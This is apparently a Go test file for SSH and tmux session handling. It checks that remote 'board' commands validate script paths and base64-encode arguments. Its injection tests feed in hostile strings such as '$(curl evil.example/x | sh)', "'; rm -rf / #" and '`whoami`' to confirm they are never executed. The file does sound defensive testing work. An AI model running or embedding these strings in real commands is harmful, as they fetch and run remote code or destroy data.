package session

import (
	"errors"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestLocalSession_BoardHostID(t *testing.T) {
	s := &LocalSession{}
	assert.Equal(t, "local", s.BoardHostID())
}

func TestTmuxLocalSession_BoardHostID(t *testing.T) {
	s := &TmuxLocalSession{}
	assert.Equal(t, "local", s.BoardHostID())
}

func TestSSHSession_BoardHostID(t *testing.T) {
	s := &SSHSession{connectionName: "build-host"}
	assert.Equal(t, "build-host", s.BoardHostID())
}

func TestTmuxSSHSession_BoardHostID(t *testing.T) {
	s := &TmuxSSHSession{connectionName: "build-host"}
	assert.Equal(t, "build-host", s.BoardHostID())
}

// Capability assertions: only SSH-backed session types implement
// BoardExecutor/BoardHomeDirer, matching CWDGetter/GitContextGetter's
// existing optional-capability pattern.
func TestBoardCapabilities_ImplementedBySSHTypesOnly(t *testing.T) {
	var _ BoardHostID = (*LocalSession)(nil)
	var _ BoardHostID = (*TmuxLocalSession)(nil)
	var _ BoardHostID = (*SSHSession)(nil)
	var _ BoardHostID = (*TmuxSSHSession)(nil)

	var _ BoardExecutor = (*SSHSession)(nil)
	var _ BoardExecutor = (*TmuxSSHSession)(nil)
	var _ BoardHomeDirer = (*SSHSession)(nil)
	var _ BoardHomeDirer = (*TmuxSSHSession)(nil)

	if _, ok := any((*LocalSession)(nil)).(BoardExecutor); ok {
		t.Fatal("LocalSession must not implement BoardExecutor")
	}
	if _, ok := any((*TmuxLocalSession)(nil)).(BoardExecutor); ok {
		t.Fatal("TmuxLocalSession must not implement BoardExecutor")
	}
}

func TestBuildBoardCommand_ScriptPathValidatedAndQuoted(t *testing.T) {
	cmd, err := buildBoardCommand([]string{"/opt/agmsg/scripts/api.sh", "get", "teams"})
	require.NoError(t, err)
	assert.True(t, strings.HasPrefix(cmd, "'/opt/agmsg/scripts/api.sh' "))
}

func TestBuildBoardCommand_RejectsRelativeOrMetacharacterScriptPath(t *testing.T) {
	_, err := buildBoardCommand([]string{"scripts/api.sh"})
	require.Error(t, err)

	_, err = buildBoardCommand([]string{"/opt/agmsg; rm -rf /"})
	require.Error(t, err)
}

func TestBuildBoardCommand_EmptyArgs(t *testing.T) {
	_, err := buildBoardCommand(nil)
	require.Error(t, err)
}

// Regression test for the earlier, incorrect "reads are digit-validated so
// don't need escaping" claim: a team/--agent value containing shell
// metacharacters on the *read* path must round-trip as a single literal
// argument, never as executed shell syntax.
func TestBoardArgLiteral_RoundTripsShellMetacharacters(t *testing.T) {
	dangerous := []string{
		`'; rm -rf / #`,
		"`whoami`",
		"$(curl evil.example/x | sh)",
		`"; echo pwned; "`,
		"team with spaces",
		"",
	}
	for _, v := range dangerous {
		lit := boardArgLiteral(v)
		// The literal must never contain the raw dangerous bytes verbatim
		// outside of the base64 encoding — otherwise it would be
		// concatenated directly into the shell command string.
		if strings.Contains(lit, v) && v != "" {
			t.Fatalf("boardArgLiteral(%q) leaked raw input into the command string: %q", v, lit)
		}
		if !strings.HasPrefix(lit, `"$(printf '%s' '`) || !strings.HasSuffix(lit, `' | base64 -d)"`) {
			t.Fatalf("boardArgLiteral(%q) = %q, unexpected shape", v, lit)
		}
	}
}

func TestBuildBoardCommand_SendShMessageBodyRoundTrips(t *testing.T) {
	body := "please review; `rm -rf /` $(evil) 'quoted'"
	cmd, err := buildBoardCommand([]string{
		"/opt/agmsg/scripts/send.sh", "panemux", "pane-a", "pane-b", body, "--force",
	})
	require.NoError(t, err)
	if strings.Contains(cmd, "rm -rf") {
		t.Fatalf("expected the message body to never appear verbatim in the command string, got: %s", cmd)
	}
	if !strings.HasSuffix(strings.TrimSpace(cmd), boardArgLiteral("--force")) {
		t.Fatalf("expected --force to be the last argument, got: %s", cmd)
	}
}

func TestRemoteBoardHomeDir_ParsesAndTrims(t *testing.T) {
	runner := &fakeSSHRunner{
		outputs: map[string][]byte{
			boardHomeDirCmd: []byte("/home/build-user\n"),
		},
	}
	home, err := remoteBoardHomeDir(runner)
	require.NoError(t, err)
	assert.Equal(t, "/home/build-user", home)
}

func TestRemoteBoardHomeDir_EmptyOutputIsError(t *testing.T) {
	runner := &fakeSSHRunner{
		outputs: map[string][]byte{
			boardHomeDirCmd: []byte(""),
		},
	}
	_, err := remoteBoardHomeDir(runner)
	require.Error(t, err)
}

func TestRemoteBoardHomeDir_CommandError(t *testing.T) {
	runner := &fakeSSHRunner{
		outputs: map[string][]byte{},
		errs:    map[string]error{boardHomeDirCmd: errors.New("probe failed")},
	}
	_, err := remoteBoardHomeDir(runner)
	require.Error(t, err)
}
